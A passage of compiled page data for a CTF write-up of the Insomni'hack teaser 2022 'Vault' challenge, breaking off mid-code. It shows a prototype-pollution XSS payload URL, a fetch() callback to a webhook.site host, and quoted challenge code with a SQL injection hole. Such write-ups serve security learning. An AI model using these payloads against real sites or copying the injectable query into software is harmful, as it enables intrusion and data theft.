{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var r=Object.create;var t=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var l=a=>t(a,\"__esModule\",{value:!0});var u=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=>{l(a);for(var c in s)t(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let e of d(s))!m.call(a,e)&&e!==\"default\"&&t(a,e,{get:()=>s[e],enumerable:!(c=p(s,e))||c.enumerable});return a},g=a=>k(l(t(a!=null?r(h(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((v,i)=>{i.exports=_jsx_runtime});var f={};N(f,{default:()=>b,frontmatter:()=>y});var n=g(o()),y={title:\"Insomni'hack teaser 2022 \\u2013 Vault\",date:\"2022-01-31\",draft:!1,authors:[\"thebish0p\"],tags:[\"Insomni'hack teaser 2022\",\"Web\",\"Prototype Pollution\",\"SQLi\",\"Error Based Injection\",\"JavaScript\",\"JSON\"],summary:\"Prototype pollution which allows to run arbitrary js in admin context and retrieve the flag through the sql injection with an error based injection.\"};function w(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(c,{})})):c();function c(){let e=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",img:\"img\",code:\"code\",pre:\"pre\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h2,{id:\"vault\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#vault\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Vault\"]}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsx)(e.p,{children:\"by clZ\"}),`\n`,(0,n.jsx)(e.p,{children:\"A competing group has created a so-called secure Vault where people can store their secrets. We have serious doubts on their capacity to actually provide such a service. Could you show everyone that their solution is not as secure as they think?\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"The Vault is available \",(0,n.jsx)(e.a,{href:\"http://vault.insomnihack.ch:5000/\",children:\"here\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"They are so confident in their solution that they also released their \",(0,n.jsx)(e.a,{href:\"https://static.insomnihack.ch/media/Vault_191c4ba6dc394e5713771ac4808a02330fd9583a-9516bb402ba3ca3401458c8d8e08d112cde7a9f7e9a5a9b349dc9ac403e1b48f_RR5HK9s.tgz\",children:\"source code\"}),\".\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"We start by checking the web page and notice that there is a login, register and report link section. So my first thought was trying to find an XSS and report a link in order to grab an admin\\u2019s cookie for example but we had an issue we can\\u2019t register:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/insomnihack-teaser-2022/registration_error.png\",alt:\"Registration Error\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We continue by checking the source code and manage to find a JavaScript Protocol Pollution bug that can lead to an XSS \",(0,n.jsx)(e.code,{children:\"http://vault.insomnihack.ch:5000/?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script#page=secrets\"}),\" as shown below:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/insomnihack-teaser-2022/xss_alert_1.png\",alt:\"Alert XSS\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Time to try to get a callback from the admin through the report link function so we just add \",(0,n.jsx)(e.code,{children:'fetch(\"https://webhook.site/388bc797-594f-4945-a407-5137e40ced43\")'}),\" to our payload, report it and get a callback:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/insomnihack-teaser-2022/first_callback.png\",alt:\"First Callback\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We noticed at this point that cookies on the site are \",(0,n.jsx)(e.code,{children:\"httpOnly\"}),\" so we need something else:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-python\",children:(0,n.jsxs)(e.code,{className:\"language-python code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token decorator annotation punctuation\",children:[\"@app\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"route\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'/api/report'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" methods\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'POST'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"contact\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    url \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" request\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"form\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"url\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    pattern \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" re\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"compile\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"^https?:\\\\/\\\\/\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"url\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"and\"}),\" pattern\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"match\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"url\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"try\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" selenium \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` webdriver\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" selenium\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"webdriver\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"common\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"keys \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` Keys\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" selenium\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"webdriver\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"chrome\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"options \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` Options\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),` time\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            session_serializer \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" SecureCookieSessionInterface\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get_signing_serializer\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"app\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            adminsession \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"dict\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            adminsession\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"admin\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            adminsession\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"username\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"admin\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            adminsession\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"password\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" os\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"ADMIN_PWD\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            session_cookie \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" session_serializer\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"dumps\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"dict\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"adminsession\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            chrome_options \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" Options\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            chrome_options\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"headless \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            chrome_options\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"add_argument\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'--no-sandbox'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            driver \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" webdriver\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"Chrome\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"/app/chromedriver\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" options\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"chrome_options\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            driver\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"set_page_load_timeout\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"30\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            driver\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"http://\"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" os\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"VHOST\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"/\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            time\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sleep\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            driver\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"add_cookie\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"name\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"session\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"value\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\"session_cookie\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"httpOnly\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            driver\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"url\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            time\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sleep\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"30\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            driver\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'status'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'OK'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"except\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'status'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'KO'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'msg'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'Error checking page'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'status'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'KO'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'msg'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'Invalid URL'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We recheck the \",(0,n.jsx)(e.code,{children:\"app.py\"}),\" file and notice that the \",(0,n.jsx)(e.code,{children:\"username\"}),\" parameter in \",(0,n.jsx)(e.code,{children:\"/api/stats\"}),\" is prone to SQL injection.\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-python\",children:(0,n.jsxs)(e.code,{className:\"language-python code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token decorator annotation punctuation\",children:[\"@app\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"route\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'/api/stats'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"stats\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"admin\"'}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" session \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"or\"}),\" session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"admin\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'status'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'KO'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'msg'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'You are not admin'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"try\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            conn_str \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Driver={ODBC Driver 17 for SQL Server};\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"Server=db,1433;\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"Database=Vault;\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"UID=\"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"username\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\";\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"PWD=\"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"password\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            conn \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" pyodbc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"connect\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"conn_str\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            cursor \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"cursor\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            sql \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:`\"SELECT inserttime FROM dbo.Stats WHERE username = '\"`}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" request\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"get\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"username\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:`\"'\"`}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            cursor\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"execute\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"sql\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            res\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"cursor\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"fetchall\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            ret\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" row \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" res\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"                ret\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"append\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'inserttime'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\"row\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            cursor\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'status'\"}),(0,n.jsx)(e.span,{className:\"token 